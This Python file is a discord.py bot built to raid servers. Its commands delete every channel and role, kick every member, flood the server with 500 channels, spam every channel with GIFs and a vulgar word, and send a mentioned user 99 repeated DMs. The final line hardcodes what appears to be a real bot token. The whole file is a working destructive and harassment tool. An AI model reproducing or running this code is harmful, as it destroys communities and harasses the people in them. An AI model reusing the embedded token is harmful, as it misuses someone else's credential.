print("Loading...")

### use the discord.py rewrite
import discord
from discord.ext import commands
from time import sleep
import random

client = commands.Bot(
    command_prefix=".",
    case_insensitive=True,
    description="",
    self_bot=False,

)


@client.command(name='zip_bomb')
async def zip_bomb(ctx):
    await ctx.send("Clearing space, Unzipping ;)")
    await delete_everychannel(ctx)
    for num in range(1, 501):
        channel = await ctx.guild.create_text_channel(num)
        await channel.send("Unzipped :smile:")


@client.command(name='kick_everyone')
async def kick_everyone(ctx):
    await ctx.send("kicking everyone")
    members = ctx.guild.members
    for member in members:
        await member.kick()
    await ctx.send("kicked them all")


@client.command(name='delete_all_roles')
async def delete_all_roles(ctx):
    roles = await ctx.guild.fetch_roles()
    await ctx.send("deleting roles")
    for role in roles:
        try:
            await role.delete()
        except:
            pass
    await ctx.send("all roles deleted")


@client.command(name='anti_channel_delete')
async def anti_channel_delete(ctx):
    for num in range(1, 501):
        await ctx.guild.create_text_channel("anti_channel_delete" + str(num))


@client.command(name='troll')
async def troll(ctx, mention, *message):
    channel = ctx.message.mentions[0]
    await ctx.send(f"Trolling {ctx.message.mentions[0].name} in DMs")
    for i in range(1, 100):
        await channel.send(" ".join(message))


@client.command(name='delete_every_channel')
async def delete_every_channel(ctx):
    await delete_everychannel(ctx)


@client.command(name='mayhem')
async def mayhem(ctx):
    await ctx.send("quatum explosona")
    for i in range(1, 6):
        await spam_everychannel(ctx, ["https://tenor.com/view/cry-about-it-gif-19162157",
                                      "https://media.discordapp.net/attachments/717500880630448238/797789221754634271/samtalk.gif",
                                      "You got sam'd",
                                      "Penis"])
    await ctx.send("mayhem complete")
    # await delete_everychannel(ctx)


async def delete_everychannel(ctx):
    channels = await ctx.guild.fetch_channels()
    for channel in channels:
        await channel.delete()


async def spam_everychannel(ctx, message):
    channels = ctx.guild.text_channels
    for channel in channels:
        await channel.send(random.choice(message))


@client.event
async def on_message(message):
    if message.author.bot:
        return

    await client.process_commands(message)


@client.event
async def on_ready():
    print('Ready')
    await client.change_presence(
        activity=discord.Activity(name='Mayhem', type=discord.ActivityType.watching))


client.run("Nzk5NTY5MDU2OTQ4NjgyNzUy.YAFetg.q_u-ljqDpgqfmkNL5p8TKjii4wg")
